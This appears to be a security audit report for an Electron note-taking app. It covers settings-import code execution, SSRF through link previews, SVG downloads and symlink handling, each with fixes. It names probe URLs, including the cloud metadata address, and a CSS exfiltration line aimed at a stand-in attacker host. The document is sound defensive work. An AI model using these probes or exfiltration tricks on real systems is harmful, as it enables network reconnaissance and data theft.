# Security

Preamble, because it matters for calibration: this codebase is unusually careful. The Electron hardening is
correct and complete (`sandbox: true`, `contextIsolation: true`, `nodeIntegration: false`, a real CSP with
`default-src 'self'` and no `unsafe-eval`, a permission handler that grants audio only and refuses everything
else, `setWindowOpenHandler` + `will-navigate` both denying in-app navigation). Path handling goes through a
single `realpath`-based guard. The clip server's five-layer defence is genuinely well reasoned. The markdown
renderer escapes note-authored HTML and filters URL schemes rather than trusting `marked`'s defaults.
`npm audit --omit=dev` reports 0 vulnerabilities.

The findings below are the exceptions, not the rule.

---

### [High] An imported settings preset can point the speech binary at any executable on disk, which is then spawned

**Where:** `src/main/ipc.ts:670-693` (`settingsProfilesImport`), `src/renderer/src/components/settings/SettingsModal.tsx:1303-1306` (Apply), `src/main/transcribe.ts:105-118` and `:179-202` (`execFile`), `src/main/whisperServer.ts:125-145` (`spawn`)
**Trigger:** User imports a settings JSON file (Settings → Profiles → Import JSON) and clicks Apply, then uses
voice dictation.
**Detail:** `Settings.voice.binaryPath` is a free-form absolute path. `locateVoiceTools` honours it verbatim and
deliberately does not second-guess it:

```ts
if (overrides.binaryPath) {
  binary = (await isFile(overrides.binaryPath)) ? overrides.binaryPath : null   // transcribe.ts:106-107
}
```

and the value reaches a process spawn unchanged:

```ts
execFile(tools.binary as string, args, { …, windowsHide: true }, …)            // transcribe.ts:180
```
```ts
const serverBinary = tools.binary.replace(/whisper-cli(\.exe)?$/i, 'whisper-server$1')
child = spawn(serverBinary, [ … ], { windowsHide: true, stdio: 'ignore' })     // whisperServer.ts:125,132
```

The import path applies no validation to this field. `normalizeSettings` (`settings.ts:152`) is a deep merge over
defaults, not a schema check — it copies any string it is given. The renderer's Apply button calls
`applyProfile(profile.settings, profile.theme)` with no confirmation, no diff, and no warning about what is
being changed.

Arguments are passed as an array, so there is no shell-injection vector — but there does not need to be one: the
executable itself is attacker-chosen.

**Impact:** Arbitrary code execution, deferred to the next time the user dictates. `windowsHide: true` means the
process runs with no visible window. A "settings file" is exactly the kind of artefact people share in a forum
thread or a dotfiles repo without treating it as executable content.
**Fix:** Two layers. (1) Validate `binaryPath`/`modelPath` on import — reject anything outside `userData` and
the OS temp directory, or drop the two fields from imported presets entirely (they describe *this machine*, not
a preference, which is the same argument the code already makes for keeping them in app-level state). (2) Show
the user what an imported preset changes before applying it, and call out the executable path specifically.
**Confidence:** Verified (traced import → `applyProfile` → `saveSettings` → `locateVoiceTools` → `execFile`).

---

### [Medium] Applying an imported preset can silently enable the web clipper with an attacker-known token

**Where:** `src/main/ipc.ts:536-555` (`settingsSet` → `syncClipServer`), `src/renderer/src/store/settingsStore.ts:243` (`applyProfile`)
**Trigger:** Same as above — import a settings JSON and click Apply.
**Detail:** `ClipperSettings` (`enabled`, `port`, `token`) is part of `Settings` and rides along in an imported
preset. Applying it persists the settings, which reaches `syncClipServer(settings.clipper)` and opens the
listener:

```ts
clipStartError = await startClipServer({ port, token, onClip })   // ipc.ts:139
```

The default is `enabled: false` with an empty token precisely so "an install that never touches the feature has
no secret sitting in its config and never opens a socket" (`settings.ts:56-59`). An imported preset overrides
that decision without asking.

The socket still binds `127.0.0.1` only and still enforces the `Host` check and extension-origin CORS, so this
is not remotely reachable — the exposure is to anything already running as the user on that machine, or to a
browser extension the attacker also controls, which can now POST notes into the vault.

**Impact:** Silent local listener with a shared secret the preset's author knows. Attacker-controlled note
content written into the user's vault.
**Fix:** Strip `clipper.token` and force `clipper.enabled: false` on import; make enabling the clipper an
explicit user action in every case.
**Confidence:** Verified.

---

### [Medium] Link previews will fetch private-network and loopback URLs, and report back what they find

**Where:** `src/main/net.ts:14-22` (`isHttp` is the only destination check), `src/main/linkPreview.ts:94-119`, `:126-149`
**Trigger:** Turn on "Fetch link previews", then open any note containing `http://192.168.1.1/`,
`http://169.254.169.254/latest/meta-data/`, or `http://localhost:8080/`.
**Detail:** The only restriction on an outbound fetch is the scheme:

```ts
export function isHttp(url: string): boolean {
  const scheme = new URL(url).protocol
  return scheme === 'http:' || scheme === 'https:'     // net.ts:17-19
}
```

There is no check against RFC 1918 ranges, loopback, link-local, or `.local`. `fetchMetadata` parses the
response's `<title>`/og tags and returns them, and `ReadView.tsx:88-113` writes them into the link card the user
is looking at. A favicon fetch (`linkPreview.ts:113`) fires for *every* http(s) link even when the page
publishes no og:image, so the request is not limited to links with previewable metadata.

This is mitigated but not eliminated by: the feature being off by default (`settings.ts:89`), the main process
re-checking the toggle rather than trusting the renderer (`ipc.ts:713-716` — good), `credentials: 'omit'`
(`net.ts:37`), a 6 s timeout, and a 512 KB body cap.

**Impact:** A note the user did not write — a clipped page, a synced vault, a shared folder, a repo README —
becomes a probe of the user's internal network, with the page title surfaced in the UI as an oracle. Response
time also distinguishes "port open" from "port closed". Nothing is transmitted off-machine, which is what keeps
this Medium rather than High.
**Fix:** Resolve the hostname and refuse private, loopback, link-local and unique-local addresses before
fetching (and re-check after redirects). At minimum, skip the automatic favicon fetch for hosts that are not
publicly routable.
**Confidence:** Verified.

---

### [Low] Remote SVG files are downloaded into the vault from clips and link previews

**Where:** `src/main/net.ts:101-111` (`IMAGE_EXTENSIONS` includes `'image/svg+xml': 'svg'`), used by `clipImages.ts:40` and `linkPreview.ts:77`
**Trigger:** Clip a page whose images are SVG, or one whose og:image is an SVG.
**Detail:** The file is written into the vault and later referenced from an `<img src="lumina://vault/…">`.
Script inside an SVG does not execute in an `<img>` context, and the renderer's CSP (`script-src 'self'`) would
block it even if the element changed, so there is no direct XSS path today.
**Impact:** Latent. An attacker-authored SVG sits inside the user's notes folder, where another application —
or a future Lumina feature that inlines SVG rather than using `<img>` — might execute it.
**Fix:** Either drop `image/svg+xml` from the accepted download types, or sanitise it on the way in. Locally
authored SVG attachments are unaffected either way.
**Confidence:** Verified.

---

### [Low] `importSpeechPack` follows symlinks when copying from a user-chosen folder

**Where:** `src/main/speechPacks.ts:151-167` (`copyTree`), `:209-241`
**Trigger:** Import a speech pack from a folder (e.g. a USB stick) that contains symlinks.
**Detail:** `entry.isDirectory()` is false for a symlink, so every symlink falls through to `fs.copyFile`, which
follows it and copies the target's contents into `userData`. A pack could therefore smuggle in a file the user
did not intend to copy, or — with a symlink named `whisper-cli.exe` — arrange for an arbitrary binary to become
the one `locateVoiceTools` finds.
**Impact:** Low. The user explicitly chose the folder through a native dialog, and the destination is inside
`userData`. It is a smaller version of the settings-import finding above, with a much higher bar.
**Fix:** Skip entries where `entry.isSymbolicLink()`, the way `snippets.ts:21` already does for `.css` files.
**Confidence:** Verified.

---

### [Not a finding] Snippet CSS is concatenated into a `<style>` element with filename-derived comment delimiters

**Where:** `src/renderer/src/store/settingsStore.ts:324-327`
**Detail:** `.map((s) => \`/* ${s.name} */\n${s.css}\`)` — a filename containing `*/` would break out of the
comment and let one snippet's *name* inject CSS. In practice `s.name` is a filename, which cannot contain `/` on
Windows, macOS or Linux, so the sequence is unreachable.

Worth recording as a non-finding rather than omitting it: the CSS content itself is arbitrary and that is by
design, and the renderer's CSP (`img-src 'self' data: blob: lumina:`, `font-src 'self' data:`, no external
`connect-src`) correctly blocks the usual CSS exfiltration channels — `background-image: url(https://attacker/…)`
will not load. That is a real defence and it is doing its job.
**Fix:** None needed. If the comment header ever moves to a value that is not a filename, escape it.
**Confidence:** Verified (as a non-issue).

---

## Checked and found sound

Recorded so a future reviewer does not re-derive them:

- **Clip token comparison** (`clipServer.ts:44-49`) — SHA-256 both sides to equalise length, then
  `timingSafeEqual`. Correct, and the comment explains why hashing precedes comparison.
- **DNS-rebinding defence** (`clipServer.ts:57-68`, `:146-149`) — the `Host` header is required to be loopback,
  which is the check that binding to `127.0.0.1` does *not* give you. Correctly identified and implemented.
- **Path traversal** (`paths.ts:19-85`) — `safeJoin` blocks `..` and NUL, then `safePathUnder` `realpath`s the
  target, or its nearest existing ancestor for a not-yet-created file, and confirms containment. `ensureLuminaDir`
  (`settings.ts:304-336`) applies the same test to `.lumina/` and `.lumina/snippets/` themselves and refuses a
  symlink. Every `fs` entry point in `vault.ts` routes through it.
- **Export XSS** (`render.ts:222-250`) — `exportRenderer.html` escapes note-authored HTML, `safeExportUrl`
  strips control characters and whitespace *before* testing the scheme (so `java\nscript:` is caught), and the
  exported document carries `default-src 'none'`. Wikilink and tag text is set with `textContent`, not markup.
- **Read-mode XSS** (`ReadView.tsx:197`) — `dangerouslySetInnerHTML` is fed only by `renderNoteFragment`, which
  uses the same hardened renderer.
- **Password storage** (`profiles.ts:21-34`) — scrypt with a random 16-byte salt, `timingSafeEqual` on
  equal-length buffers, plaintext confined to one function. The module header is explicit that this is a UI gate
  and not encryption, which is the honest framing.
- **Deletion** (`vault.ts:227-238`) — `shell.trashItem`, not `unlink`.
- **Atomic writes** (`vault.ts:147-164`, `settings.ts:168-187`) — temp file with `flag: 'wx'` then rename, with
  the temp cleaned up on failure and writes serialised per file.
- **Body caps** — `CLIP_BODY_CAP` enforced against bytes received rather than `Content-Length`
  (`clipServer.ts:93-109`, `net.ts:50-99`).
- **Clip validation** (`clip.ts:68-105`) — every field re-derived rather than spread, control characters
  stripped, URLs scheme-checked, filenames sanitised including Windows reserved names, YAML values quoted when
  they would otherwise change type.
